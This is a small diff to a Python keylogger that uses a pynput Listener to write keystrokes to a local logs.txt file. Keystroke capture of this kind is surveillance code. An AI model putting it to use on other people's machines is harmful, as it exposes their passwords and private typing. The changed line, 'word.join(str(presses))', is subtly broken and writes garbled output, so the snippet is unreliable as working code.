@@ -7,7 +7,7 @@ presses = []
 def log_key(key):
     with open("logs.txt", "a") as f:
         word = ""
-        word = word.join(presses)
+        word = word.join(str(presses))
         f.write(word)
         f.write(" ")
         presses.clear() #resetting presses
@@ -24,3 +24,5 @@ def on_release(key):
         
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+    
